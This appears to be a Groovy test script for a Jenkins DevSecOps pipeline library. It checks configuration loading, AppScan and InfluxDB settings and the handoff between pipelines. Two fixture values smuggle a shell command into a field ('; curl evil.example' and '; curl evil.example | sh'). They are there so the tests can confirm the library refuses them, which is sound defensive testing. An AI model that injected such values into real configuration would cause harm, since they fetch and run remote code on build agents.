import devsecops.test.FakeCpsScript
import devsecops.test.FakeRemoteHandle
import devsecops.test.FakeScript
import devsecops.test.SandboxHarness
import org.yaml.snakeyaml.Yaml

File root = new File(args.length > 0 ? args[0] : '.').canonicalFile
File srcDir = new File(root, 'src')
File stubDir = new File(root, 'test/sandbox/stub')
File varsDir = new File(root, 'vars')

int failures = 0
Closure check = { String name, boolean ok, Object detail ->
    if (ok) {
        println "PASS  ${name}"
    } else {
        failures++
        println "FAIL  ${name}"
        if (detail) println "      ${detail}"
    }
}

Yaml yaml = new Yaml()
String securityJob = 'DevSecOps/CertScanner/security'
String bundledName = 'com/bbh/devsecops/defaults.yaml'
String defaultsText = new File(root, 'test/fixtures/defaults.yaml').text
String configText = new File(root, 'test/fixtures/CertScanner/config.yaml').text

Closure jenkins = { Map env ->
    FakeScript j = new FakeScript()
    j.resourcesDir = new File(root, 'resources')
    j.resources[bundledName] = defaultsText
    j.env.vars.putAll([BUILD_NUMBER: '42', JOB_NAME: 'DevSecOps/CertScanner'])
    (env ?: [:]).each { k, v -> j.env.vars.put(k as String, v as String) }
    return j
}

Closure failureOf = { Throwable t -> SandboxHarness.rejectionOf(t) ?: t.message ?: t.toString() }

Closure load = { FakeScript j, String variant, Map jenkinsfile ->
    SandboxHarness harness = new SandboxHarness(srcDir, stubDir)
    def state = null
    def loader = null
    String error = ''
    try {
        harness.run {
            state = harness.type('com.bbh.core.PipelineState').newInstance()
            loader = harness.type('com.bbh.config.ConfigLoader').newInstance(j, state)
            loader.load(variant, jenkinsfile)
        }
    } catch (Throwable t) {
        error = failureOf(t)
    }
    return [harness: harness, state: state, loader: loader, error: error]
}

Closure initialize = { Map r ->
    try {
        (r.harness as SandboxHarness).run { r.loader.initialize() }
        return ''
    } catch (Throwable t) {
        return failureOf(t)
    }
}

Closure configWith = { Closure change ->
    Map config = yaml.load(configText) as Map
    change(config.projects as Map)
    yaml.dump(config)
}
Closure fromFile = { String variant, Map jenkinsfile, Map files, Map env = [:] ->
    FakeScript s = jenkins(env)
    s.files.putAll(files)
    Map loaded = load(s, variant, jenkinsfile)
    loaded + [j: s, initError: loaded.error ?: initialize(loaded)]
}
Closure apiRun = { FakeScript s, Closure body ->
    SandboxHarness h = new SandboxHarness(srcDir, stubDir)
    FakeCpsScript a = h.loadVars(varsDir, s)['devSecOpsApi'] as FakeCpsScript
    String error = ''
    try {
        h.run { body(a) }
    } catch (Throwable t) {
        error = failureOf(t)
    }
    return [api: a, error: error, state: a.@_state, harness: h]
}
Closure attempt = { SandboxHarness h, Closure body ->
    try {
        h.run(body)
        return ''
    } catch (Throwable t) {
        return failureOf(t)
    }
}
Closure runStateOf = { FakeScript s -> s.files['pipeline-config.yaml'] ? ((yaml.load(s.files['pipeline-config.yaml']) as Map).projects ?: [:]) as Map : [:] }
Closure readFrom = { String file -> "[INIT] The services come from ${file} in the repository, the global settings from the library (resources/${bundledName})".toString() }
Map agents = [agentNames: ['linux-agent']]

Closure runEntryPoint = { String name, Map jenkinsfile, Map env = [:] ->
    FakeScript s = jenkins(env)
    s.files['devsecops_config.yaml'] = configText
    FakeCpsScript entryPoint = new SandboxHarness(srcDir, stubDir).loadVars(varsDir, s)[name] as FakeCpsScript
    String crash = ''
    try {
        new SandboxHarness(srcDir, stubDir).run { entryPoint.call(jenkinsfile) }
    } catch (Throwable t) {
        crash = failureOf(t)
    }
    boolean untouched = entryPoint.executedStages.isEmpty() && !s.files.containsKey('report/pipeline-report.html') && s.calls.isEmpty() && s.probes.isEmpty()
    return [crash: crash, untouched: untouched, detail: "${crash} | stages ${entryPoint.executedStages} | calls ${s.calls} | probes ${s.probes}".toString()]
}

String example = "(projectNames: '<services of this repository>', agentNames: ['<agent label>']"
Closure noAgents = { String call, String security ->
    "[INIT] No agentNames in the Jenkinsfile: write ${call}${example}${security}) and commit devsecops_config.yaml or config.yaml at the root of the repository".toString()
}
Closure keyGiven = { String call, String security ->
    ("[INIT] pipelineKey and pipelineKeys are settings of the DevSecOps portal, which this release of the library does not read: " +
            "write ${call}${example}${security}) and commit devsecops_config.yaml at the root of the repository").toString()
}
String extendedJob = ", securityPipeline: '<security job>'"

[[call: 'devSecOpsPipeline', security: ''], [call: 'devSecOpsNexusIqGoldenFixPipeline', security: ''], [call: 'devSecOpsExtendedPipeline', security: extendedJob]].each { Map spec ->
    Map run = runEntryPoint(spec.call as String, [projectNames: 'gui'])
    check("${spec.call} without agentNames: stops before pipeline {} with the call to write and both file names, runs nothing and looks at no file",
            run.crash == noAgents(spec.call as String, spec.security as String) && run.untouched, run.detail)
}

[[pipelineKey: '5e0f0001-8c2b-4f6a-9d3e-1a7b2c4d0001'], [pipelineKeys: ['5e0f0001-8c2b-4f6a-9d3e-1a7b2c4d0001']], [pipelineKey: ''], [pipelineKey: null], [pipelineKeys: []]].each { Map key ->
    Map run = runEntryPoint('devSecOpsPipeline', key + agents + [projectNames: 'gui'])
    check("a Jenkinsfile with ${key}: stops before pipeline {} with the call to write, runs nothing and looks at no file, also with agentNames",
            run.crash == keyGiven('devSecOpsPipeline', '') && run.untouched, run.detail)
}
Map extendedKey = runEntryPoint('devSecOpsExtendedPipeline', [pipelineKey: ''])
check('the extended entry point with a pipelineKey also names the security job to copy from',
        extendedKey.crash == keyGiven('devSecOpsExtendedPipeline', extendedJob) && extendedKey.untouched, extendedKey.detail)

Map plain = fromFile('full', agents, ['devsecops_config.yaml': configText])
Map required = fromFile('full', agents, ['devsecops_config.yaml': configText], [DSO_REQUIRE_PIPELINE_KEY: 'true'])
FakeScript requiredJenkins = jenkins([DSO_REQUIRE_PIPELINE_KEY: 'true', PROJECT_NAME: 'gui'])
requiredJenkins.files['config.yaml'] = configText
Map requiredApi = apiRun(requiredJenkins) { fake -> requiredJenkins.onAgent('linux-agent') { fake.initialize() } }
check('DSO_REQUIRE_PIPELINE_KEY=true changes nothing: the Jenkinsfile loads the same file, and initialize() without configure() reads config.yaml',
        !plain.initError && !required.initError && required.state.configFile == 'devsecops_config.yaml'
                && (required.state.projectsAllCfg as Map) == (plain.state.projectsAllCfg as Map) && required.j.log == plain.j.log
                && !requiredApi.error && requiredApi.state.configFile == 'config.yaml',
        "${plain.initError} | ${required.initError} | ${requiredApi.error}")

FakeScript j = jenkins([:])
j.files['devsecops_config.yaml'] = configText
Map configured = [:]
List callsBefore = []
List probesBefore = []
List logBefore = []
String placeBefore = ''
String placeAfter = ''
Map run = apiRun(j) { fake ->
    fake.configure('full', [projectNames: ['gui', 'backend-api'], agentNames: ['linux-agent'], securityPipeline: securityJob, appId: 'from-the-jenkinsfile'])
    configured = fake.pipelineConfig() as Map
    placeBefore = fake.settingsPlace()
    callsBefore = new ArrayList(j.calls)
    probesBefore = new ArrayList(j.probes)
    logBefore = new ArrayList(j.log)
    j.onAgent('linux-agent') { fake.initialize() }
    placeAfter = fake.settingsPlace()
}
check('configure() keeps the Jenkinsfile values (projectNames as a list is joined), sets Security_Pipeline, takes no node, runs no step, looks at no file and logs nothing',
        configured.agentNames == ['linux-agent'] && configured.securityPipeline == securityJob && configured.projectNames == 'gui,backend-api'
                && configured.appId == 'from-the-jenkinsfile' && j.env.Security_Pipeline == securityJob && callsBefore.isEmpty() && probesBefore.isEmpty()
                && logBefore.isEmpty() && placeBefore == 'devsecops_config.yaml or config.yaml',
        "${configured} | ${callsBefore} | ${probesBefore} | ${logBefore} | ${placeBefore}")
check('initialize() reads devsecops_config.yaml, names it and writes its services in file order to the run-state file',
        !run.error && j.log.contains(readFrom('devsecops_config.yaml')) && placeAfter == 'devsecops_config.yaml'
                && runStateOf(j).keySet().toList() == ['gui', 'backend-api'],
        "${run.error} | ${placeAfter} | ${runStateOf(j).keySet()}")

Map reversed = fromFile('full', agents + [projectNames: ' backend-api , gui '], ['devsecops_config.yaml': configText])
check('projectNames in another order: the first service is the primary one and the order is kept in PROJECT_NAMES and projectsAllCfg, the run-state file keeps the order of the file',
        !reversed.initError && reversed.j.env.PROJECT_NAMES == ' backend-api , gui ' && reversed.state.currentProjectName == 'backend-api'
                && (reversed.state.projectsAllCfg as Map).keySet().toList() == ['backend-api', 'gui'] && runStateOf(reversed.j).keySet().toList() == ['gui', 'backend-api'],
        "${reversed.initError} | ${reversed.state?.currentProjectName} | ${(reversed.state?.projectsAllCfg as Map)?.keySet()}")
check('the merged configuration is the library defaults under each service of the file',
        (plain.state.projectsAllCfg.gui as Map).sast?.pollTimeoutMin == 50 && (plain.state.projectsAllCfg.gui as Map).sast?.scanName == 'CertScanner-GUI-SAST'
                && (plain.state.cfgDefaults as Map).coverage?.minLine == 60 && plain.state.platform == [:],
        plain.state.projectsAllCfg.gui)

String otherKeyId = 'bbh_0c1d2e3f-4a5b-6c7d-8e9f-a0b1c2d3e4f5'
Map perKey = fromFile('full', agents, ['devsecops_config.yaml': configWith { Map p -> ((p['backend-api'] as Map).asoc as Map).keyId = otherKeyId }])
String primaryKeyId = perKey.j.env.APPSCAN_KEY_ID
if (!perKey.initError) perKey.harness.run { perKey.loader.switchProject('backend-api') }
check('an AppScan key per service: APPSCAN_KEY_ID is the key of the primary service after the start and the key of the current service after switchProject',
        !perKey.initError && primaryKeyId == 'bbh_b81fbc9f-39c1-8eb4-38b5-b702268969b9' && perKey.j.env.APPSCAN_KEY_ID == otherKeyId,
        "${perKey.initError} | ${primaryKeyId} | ${perKey.j.env.APPSCAN_KEY_ID}")

j = jenkins([PROJECT_NAME: 'gui'])
j.files['config.yaml'] = configText
String customPlace = ''
run = apiRun(j) { fake ->
    j.onAgent('linux-agent') { fake.initialize() }
    customPlace = fake.settingsPlace()
}
check('a custom Jenkinsfile that calls initialize() without configure() reads config.yaml for PROJECT_NAME',
        !run.error && j.log.contains(readFrom('config.yaml')) && (run.state.projectsAllCfg as Map).keySet().toList() == ['gui'] && customPlace == 'config.yaml'
                && runStateOf(j).keySet().toList() == ['gui'],
        "${run.error} | ${customPlace} | ${runStateOf(j).keySet()}")

Map noKeyId = fromFile('full', agents, ['config.yaml': configWith { Map p -> ((p['backend-api'] as Map).asoc as Map).remove('keyId') }])
check('a service without asoc.keyId stops the build at the start, also when it is not the primary service, and the message names the file',
        noKeyId.initError == '[INIT] asoc.keyId must be set for the service backend-api in config.yaml', noKeyId.initError)

Map invalid = fromFile('full', agents, ['devsecops_config.yaml': 'projects: ['])
check('a file that is not YAML names the file and the parser message', (invalid.initError as String).startsWith('[INIT] devsecops_config.yaml is not valid YAML: '), invalid.initError)

['', '- gui', 'defaults: {}'].each { String text ->
    Map empty = fromFile('full', agents, ['devsecops_config.yaml': text])
    check("a file without projects (${text ?: 'empty'}) is refused", empty.initError == "[INIT] devsecops_config.yaml must contain a 'projects:' section.", empty.initError)
}

Map unknown = fromFile('full', agents + [projectNames: 'web'], ['devsecops_config.yaml': configText])
check('a service the file does not have lists every service of the file',
        unknown.initError == "[INIT] Project 'web' not found in devsecops_config.yaml. Available: gui, backend-api", unknown.initError)

String unscannedConfig = configWith { Map p ->
    (((p.gui as Map).tools as Map).nexusIq as Map).remove('application')
    (((p['backend-api'] as Map).tools as Map).nexusIq as Map).scanPatterns = []
}
Map unscanned = fromFile('nexusiq', agents, ['devsecops_config.yaml': unscannedConfig])
Map unscannedFull = fromFile('full', agents, ['devsecops_config.yaml': unscannedConfig])
Map complete = fromFile('nexusiq', agents, ['devsecops_config.yaml': configText])
check('the Nexus IQ GoldenFix pipeline stops at the start for a service it would not scan and names the file; the other pipelines and complete services are not affected',
        unscanned.initError == '[INIT] The Nexus IQ GoldenFix pipeline would scan nothing for gui, backend-api: set tools.nexusIq.application and its scanPatterns for the service in devsecops_config.yaml'
                && !unscannedFull.initError && !complete.initError,
        "${unscanned.initError} | ${unscannedFull.initError} | ${complete.initError}")

Map bundled = yaml.load(defaultsText) as Map
bundled.platform = [iosBuildAgent: 'mac-builder.bbh.example', oisHost: 'ois.bbh.example', nexusSnapshotRepositoryId: 'team-snapshots',
                    nexusSnapshotRepositoryUrl: 'https://nexus.bbh.example/repository/team-snapshots/',
                    environment: [PROXY_HOST: 'platform-proxy.bbh.example', PROXY_PORT: 8080, SA_LINUX_URL: 'https://nexus.bbh.example/SAClientUtil_Linux.zip']]
String flutterApp = yaml.dump([projects: [app: [buildTool: 'flutter', javaPath: '/usr/lib/jvm/java-17-openjdk', asoc: [keyId: 'bbh_app-key'],
                                                build: [credentialsId: ['app-certificate-password', 'misnap-prod-license', 'misnap-test-license']], tools: [flutter: [flutterModules: []]],
                                                delivery: [group: 'com.bbh.app', artifact: 'app', plugin: 'deploy:deploy-file']]]])
j = jenkins([PROXY_HOST: 'agent-proxy.bbh.com'])
j.resources[bundledName] = yaml.dump(bundled)
j.files['devsecops_config.yaml'] = flutterApp
List<String> secretResources = ['a2a-certs/a2a.sh', 'a2a-certs/get-a2a-password.sh', 'a2a-certs/loginfile.sh',
                   'a2a-certs/PROXY_ASOCJenk.cert.pem', 'a2a-certs/PROXY_ASOCJenk.key.pem', 'a2a-certs/PROXY_ASOCJenk.keypsw']
Closure appScanFiles = { FakeScript s ->
    secretResources.each { String name -> s.resources[name] = "fake ${name}".toString() }
    s.files['.appscan-logs/proxy.pass'] = 'proxy-secret'
}
appScanFiles(j)
run = apiRun(j) { fake ->
    fake.configure('full', agents + [projectNames: 'app'])
    j.onAgent('linux-agent') { fake.initialize() }
}
['password', 'prodLicense', 'testLicense'].each { (run.api as Script).binding.setVariable(it, "fake-${it}".toString()) }
String iosError = attempt(run.harness as SandboxHarness) { j.onAgent('linux-agent') { run.api.@_build.buildArtifact() } }
String oisError = attempt(run.harness as SandboxHarness) { j.onAgent('linux-agent') { run.api.@_appScan.setup() } }
attempt(run.harness as SandboxHarness) { j.onAgent('linux-agent') { run.api.@_vmDeploy.pushToNexus('app') } }
String snapshot = j.calls.find { it.contains('deploy:deploy-file') && it.contains('-DartifactId=app-android') } ?: ''

List<String> ois = j.calls.findAll { it.contains('ois.bbh.example') }
check('a platform: section of the bundled defaults sets the tool environment, and a variable of the agent or of Jenkins still wins over platform.environment',
        !run.error && run.state.platform == bundled.platform && j.env.PROXY_HOST == 'agent-proxy.bbh.com' && j.env.PROXY_PORT == '8080'
                && j.env.SA_LINUX_URL == 'https://nexus.bbh.example/SAClientUtil_Linux.zip' && j.env.PROXY_USER == 'PROXY_ASOCJenk',
        "${run.error} | ${run.state?.platform} | PROXY_HOST=${j.env.PROXY_HOST} PROXY_PORT=${j.env.PROXY_PORT} PROXY_USER=${j.env.PROXY_USER} SA_LINUX_URL=${j.env.SA_LINUX_URL}")
check('a platform: section of the bundled defaults moves the iOS build to its agent, the proxy password read to its OIS host and the Flutter snapshot to its Nexus repository',
        !iosError && j.calls.contains('node mac-builder.bbh.example') && !j.calls.contains('node mac002.bbh.com')
                && !oisError && ois && !j.calls.any { it.contains('oisapi.bbh.com') }
                && snapshot.contains('-DrepositoryId=team-snapshots') && snapshot.contains('-Durl=https://nexus.bbh.example/repository/team-snapshots/'),
        [iosError, oisError] + j.calls.findAll { it.startsWith('node ') } + [snapshot])

j = jenkins([:])
j.resources[bundledName] = yaml.dump(bundled + [platform: [oisHost: 'ois.bbh.example; curl evil.example']])
j.files['devsecops_config.yaml'] = flutterApp
appScanFiles(j)
run = apiRun(j) { fake ->
    fake.configure('full', agents)
    j.onAgent('linux-agent') { fake.initialize() }
}
oisError = attempt(run.harness as SandboxHarness) { j.onAgent('linux-agent') { run.api.@_appScan.setup() } }
check('an OIS host of the bundled defaults that is not a host name stops the AppScan setup before any step uses it, and without platform.environment the tool environment keeps its literals',
        !run.error && oisError == "[APPSCAN] platform.oisHost 'ois.bbh.example; curl evil.example' of the library defaults is not a host name"
                && j.env.PROXY_HOST == 'tstproxy.bbh.com' && j.env.APPSCAN_SERVER_URL == 'https://bbh.cloud.appscan.com',
        "${run.error} | ${oisError} | ${j.env.PROXY_HOST}")

j = jenkins([:])
j.files['devsecops_config.yaml'] = configWith { Map p ->
    p.each { name, service ->
        Map influx = (service as Map).influx as Map
        influx.remove('token')
        influx.credentialsId = 'influxdb-token'
        influx.project = "CertScanner-${name}".toString()
    }
}
run = apiRun(j) { fake ->
    fake.configure('full', agents)
    j.onAgent('linux-agent') {
        fake.initialize()
        fake.eachProject { String name -> }
        fake.feedInfluxDB('')
    }
}
List<String> influxLines = j.files.findAll { k, v -> (k as String).startsWith('influx_payload_') }.collect { k, v -> v as String }.join('\n').readLines()
check('several services: the metrics carry the InfluxDB settings of the primary service, not of the service handled last',
        !run.error && j.env.CURRENT_PROJECT_NAME == 'backend-api' && influxLines.any { it.startsWith('pipeline_run,project=CertScanner-gui,env=test,') }
                && !influxLines.any { it.contains('project=CertScanner-backend-api') },
        "${run.error} | ${influxLines.findAll { it.startsWith('pipeline_run,') }}")
String influxSh = j.calls.find { it.contains('curl ') && it.contains('$INFLUX_URL') } ?: ''
check('InfluxDB upload: the token, the address, the payload and the response file reach curl through the environment, the answer of InfluxDB is printed, a curl error or an HTTP status of 300 or more fails the step, and both files are removed',
        influxSh == '''sh set +x
code=$(curl -sS -o "$INFLUX_RESPONSE" -w '%{http_code}' -X POST "$INFLUX_URL" -H "Authorization: Token $INFLUX_TOKEN" --data-binary "@$INFLUX_FILE") || exit $?
echo "[INFLUX] HTTP $code $(cat "$INFLUX_RESPONSE" 2>/dev/null)"
[ "$code" -lt 300 ]
'''
                && j.calls.contains('withCredentials [influxdb-token]') && !j.calls.any { it.contains('fake-INFLUX_TOKEN') }
                && j.calls.any { it ==~ /withEnv \[INFLUX_URL=http:\/\/qcwsecopsmon1\.testbbh\.com:8086\/api\/v2\/write\?org=DevSecOps&bucket=DORA-metrics&precision=s, INFLUX_FILE=influx_payload_(\d+)\.txt, INFLUX_RESPONSE=influx_response_\1\.txt\]/ }
                && j.calls.any { it ==~ /sh rm -f 'influx_payload_(\d+)\.txt' 'influx_response_\1\.txt'/ },
        j.calls.findAll { it.contains('INFLUX') || it.contains('influx_') || it.startsWith('withCredentials') })

j = jenkins([:])
j.files['devsecops_config.yaml'] = configWith { Map p -> Map influx = (p.gui as Map).influx as Map; influx.remove('token'); influx.credentialsId = 'influxdb-token' }
run = apiRun(j) { fake ->
    fake.configure('full', agents + [projectNames: 'gui'])
    j.unix = false
    j.onAgent('windows-agent') {
        fake.initialize()
        fake.feedInfluxDB('')
    }
}
String influxPs = j.calls.find { it.contains('curl.exe ') } ?: ''
check('InfluxDB upload on Windows: the same environment reaches curl.exe, the answer of InfluxDB is printed, a curl error or an HTTP status of 300 or more fails the step, and both files are removed',
        !run.error && influxPs == '''powershell $code = curl.exe -sS -o "$env:INFLUX_RESPONSE" -w '%{http_code}' -X POST "$env:INFLUX_URL" -H "Authorization: Token $env:INFLUX_TOKEN" --data-binary "@$env:INFLUX_FILE"
if ($LASTEXITCODE) { exit $LASTEXITCODE }
Write-Host "[INFLUX] HTTP $code $(Get-Content -Raw $env:INFLUX_RESPONSE -ErrorAction SilentlyContinue)"
if ([int]$code -ge 300) { exit 1 }
'''
                && j.calls.contains('withCredentials [influxdb-token]') && !j.calls.any { it.contains('fake-INFLUX_TOKEN') }
                && j.calls.any { it ==~ /withEnv \[INFLUX_URL=\S+, INFLUX_FILE=influx_payload_(\d+)\.txt, INFLUX_RESPONSE=influx_response_\1\.txt\]/ }
                && j.calls.any { it ==~ /powershell Remove-Item -Force 'influx_payload_(\d+)\.txt', 'influx_response_\1\.txt' -ErrorAction SilentlyContinue/ },
        "${run.error} | ${j.calls.findAll { it.contains('INFLUX') || it.contains('influx_') || it.startsWith('withCredentials') }}")

Map copied = [projects: [gui: [appId: 'taken-from-the-security-run', delivery: '57-20261006-081500'],
                         'backend-api': [deploy: [openshift: [rd: [buildTag: '213-20261006-081500', projectBuildR: 'elsewhere',
                                                                   internalDockerUrl: 'image-registry.openshift-image-registry.svc:5000/ta-certscanner-build/certscanner-api@sha256:5f1c0ffee']]]]]]
Map extendedFile = agents + [projectNames: 'gui,backend-api', securityPipeline: securityJob]
Map handoff = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText, 'pipeline-config.yaml': yaml.dump(copied)])
Map handoffRd = ((((handoff.state?.projectsAllCfg as Map)?.get('backend-api') as Map)?.deploy as Map)?.openshift as Map)?.rd as Map
check('extended handoff: only the run-time tags of the security run are laid over the services of the file',
        !handoff.initError && handoff.j.env.Security_Pipeline == securityJob && (handoff.state.projectsAllCfg.gui as Map).delivery == '57-20261006-081500'
                && (handoff.state.projectsAllCfg.gui as Map).appId == '209f44ac-dd06-4ca0-884e-d944904f8020'
                && handoffRd?.buildTag == '213-20261006-081500' && (handoffRd?.internalDockerUrl as String)?.endsWith('@sha256:5f1c0ffee')
                && handoffRd?.projectBuildR == 'ta-certscanner-build',
        "${handoff.initError} | ${handoffRd}")
check('extended handoff: the extended run writes its own run-state file with the overlay',
        (runStateOf(handoff.j).gui as Map)?.delivery == '57-20261006-081500' && (runStateOf(handoff.j).gui as Map)?.appId == '209f44ac-dd06-4ca0-884e-d944904f8020',
        runStateOf(handoff.j).gui)
Map foreign = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText, 'pipeline-config.yaml': yaml.dump([projects: [gui: copied.projects.gui]])])
check('extended handoff: a security run that lacks a service of this run is refused',
        foreign.initError == "[INIT] Security pipeline ${securityJob} builds gui, this run builds backend-api".toString(), foreign.initError)
String withWeb = configWith { Map p -> p.web = yaml.load(yaml.dump(p.gui)) }
Map third = fromFile('extended', extendedFile, ['devsecops_config.yaml': withWeb, 'pipeline-config.yaml': yaml.dump(copied)])
check('extended handoff: a service of the file that this run does not build is neither checked nor written',
        !third.initError && runStateOf(third.j).keySet().toList() == ['gui', 'backend-api'], "${third.initError} | ${runStateOf(third.j).keySet()}")
Map invalidTag = fromFile('extended', agents + [projectNames: 'backend-api', securityPipeline: securityJob],
        ['devsecops_config.yaml': configText, 'pipeline-config.yaml': yaml.dump([projects: ['backend-api': [deploy: [openshift: [rd: [buildTag: '213; curl evil.example | sh']]]]]])])
check('extended handoff: a tag that is not a plain tag is refused before any step uses it',
        (invalidTag.initError as String).startsWith("[INIT] pipeline-config.yaml of ${securityJob} holds an invalid deploy.openshift.rd.buildTag for backend-api: ".toString()), invalidTag.initError)
Map predates = fromFile('extended', extendedFile, ['devsecops_config.yaml': configText])
check('extended handoff: a security build of a library release that archived config.yaml says what to run',
        predates.initError == "[INIT] The last successful build of ${securityJob} has no pipeline-config.yaml: it was built by a library release that archived config.yaml instead; run ${securityJob} once with this release".toString(),
        predates.initError)
Map standalone = fromFile('extended', agents + [projectNames: 'backend-api'], ['devsecops_config.yaml': configWith { Map p ->
    ((((p['backend-api'] as Map).deploy as Map).openshift as Map).rd as Map).buildTag = '200-20260901-000000'
}])
check('a standalone extended pipeline (no securityPipeline): no copy, the services of the file with their pinned tag',
        !standalone.initError && !standalone.j.env.Security_Pipeline && !standalone.j.probes.contains('fileExists pipeline-config.yaml')
                && ((((standalone.state.projectsAllCfg as Map)['backend-api'] as Map).deploy as Map).openshift as Map).rd.buildTag == '200-20260901-000000'
                && standalone.j.files.containsKey('pipeline-config.yaml'),
        standalone.initError)

Map fullWithJob = fromFile('full', agents + [securityPipeline: securityJob], ['devsecops_config.yaml': configText])
check('a full pipeline that names a securityPipeline only sets Security_Pipeline and copies nothing',
        !fullWithJob.initError && fullWithJob.j.env.Security_Pipeline == securityJob && !fullWithJob.j.probes.contains('fileExists pipeline-config.yaml'),
        fullWithJob.initError)

j = jenkins([:])
SandboxHarness buildHarness = new SandboxHarness(srcDir, stubDir)
List<Map> triggered = []
j.steps['triggerRemoteJob'] = { Map a -> triggered << a; new FakeRemoteHandle(buildResult: 'SUCCESS', buildUrl: 'https://jenkins-b.bbh.com/job/smoke/12/') }
String buildError = ''
try {
    buildHarness.run {
        def state = buildHarness.type('com.bbh.core.PipelineState').newInstance()
        def os = buildHarness.type('com.bbh.core.OsHelper').newInstance(j)
        def policy = buildHarness.type('com.bbh.core.PolicyEngine').newInstance(j, state, os)
        def build = buildHarness.type('com.bbh.build.BuildService').newInstance(j, state, os, policy)
        build.runSingleTestJob('Smoke tests', [name: 'login smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/login',
                                               tokenCredentialsId: 'cert-scanner-remote-token', credentialsId: 'remote-jenkins-api-token'], 0, 15)
        build.runSingleTestJob('Smoke tests', [name: 'legacy smoke', type: 'remote', job: 'https://jenkins-b.bbh.com/job/smoke/job/legacy', token: 'plain-token'], 1, 15)
    }
} catch (Throwable t) {
    buildError = failureOf(t)
}
check('remote test jobs: tokenCredentialsId is bound from Jenkins credentials, a plain token still works',
        !buildError && triggered.size() == 2 && triggered[0].token == 'fake-REMOTE_JOB_TOKEN' && triggered[1].token == 'plain-token'
                && j.calls.count('withCredentials [cert-scanner-remote-token]') == 1 && j.env.REMOTE_JOB_TOKEN == null,
        "${buildError} | ${triggered.collect { it.token }} | ${j.calls}")

j = jenkins([:])
j.params.RUN_EXTENDED_PIPELINE = true
j.files['devsecops_config.yaml'] = configWith { Map p -> ((p.gui as Map).jenkins as Map).remove('pipeline') }
run = apiRun(j) { fake ->
    fake.configure('full', agents + [projectNames: 'gui'])
    j.onAgent('linux-agent') { fake.initialize() }
    fake.runExtendedPipeline()
}
check('a service message names the file that was read',
        !run.error && j.log.contains('Skipping extended pipeline - jenkins.pipeline.extendedPipeline is not set for the service in devsecops_config.yaml'),
        "${run.error} | ${j.log.findAll { it.startsWith('Skipping') }}")

println "\n${failures == 0 ? 'ALL CONFIG SCENARIOS PASSED' : failures + ' CONFIG SCENARIO CHECK(S) FAILED'}"
System.exit(failures == 0 ? 0 : 1)
